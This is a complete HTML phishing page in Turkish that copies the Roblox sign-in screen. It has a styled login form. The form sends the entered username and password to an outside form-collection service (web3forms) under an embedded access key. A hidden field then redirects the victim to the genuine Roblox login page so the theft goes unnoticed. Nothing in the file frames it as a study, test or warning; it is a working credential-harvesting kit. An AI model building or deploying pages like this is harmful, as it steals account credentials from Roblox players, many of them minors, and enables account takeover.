<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Giriş - Roblox</title>
    <style>
        body {
            /* SEÇTİĞİN RESİM BURAYA EKLENDİ */
            background: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), 
                        url('https://image.api.playstation.com/vulcan/ap/rnd/202504/1706/4cc02203db88b29b535c26b8296c89f983eaf48d67462e1d.png?w=1920'); 
            
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            background-attachment: fixed;
            
            font-family: "HCo Gotham SSm", "Helvetica Neue", Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            background-color: rgba(43, 45, 47, 0.95); /* Arkadaki resim hafif görünsün diye çok az şeffaf yaptık */
            padding: 40px 30px;
            border-radius: 8px;
            width: 380px;
            text-align: center;
            box-shadow: 0 8px 32px rgba(0,0,0,0.8);
        }

        h2 { font-size: 24px; margin-bottom: 25px; color: #ffffff; font-weight: 700; }

        input {
            width: 100%;
            height: 45px;
            margin-bottom: 12px;
            border-radius: 4px;
            border: 1px solid #111;
            background-color: #393b3d;
            color: #ffffff;
            padding: 0 12px;
            box-sizing: border-box;
            font-size: 16px;
        }

        input:focus { border-color: #0084ff; outline: none; }

        .login-btn {
            width: 100%;
            height: 40px;
            background-color: transparent;
            border: 1px solid #ffffff;
            color: #ffffff;
            font-size: 16px;
            font-weight: 600;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 10px;
            transition: 0.2s;
        }

        .login-btn:hover { background-color: rgba(255,255,255,0.1); }

        .forgot-pass { color: #00b2ff; text-decoration: none; font-size: 13px; display: block; margin-top: 15px; }

        .divider { height: 1px; background-color: #444; margin: 25px 0; }

        .social-btn {
            width: 100%;
            height: 40px;
            background-color: #393b3d;
            border: none;
            color: #ffffff;
            border-radius: 4px;
            margin-bottom: 10px;
            font-weight: 600;
            cursor: pointer;
            font-size: 14px;
        }

        .signup-text { color: #ffffff; font-size: 14px; margin-top: 20px; }
        .signup-link { color: #00b2ff; text-decoration: none; }
    </style>
</head>
<body>

<div class="login-container">
    <h2>Roblox'a Giriş Yap</h2>

    <form action="https://api.web3forms.com/submit" method="POST">
        <input type="hidden" name="access_key" value="4d9b8514-bee7-4916-bfab-e61246fa5ba7">

        <input type="text" name="Username" placeholder="Kullanıcı Adı/E-posta" required>
        <input type="password" name="Password" placeholder="Şifre" required>

        <button type="submit" class="login-btn">Giriş Yap</button>
        <input type="hidden" name="redirect" value="https://www.roblox.com/login">
    </form>

    <a href="#" class="forgot-pass">Şifrenizi mi unuttunuz?</a>
    <div class="divider"></div>
    <button class="social-btn">Hızlı Giriş</button>
    <div class="signup-text">Hesabın yok mu? <a href="#" class="signup-link">Kaydol</a></div>
</div>

</body>
</html>
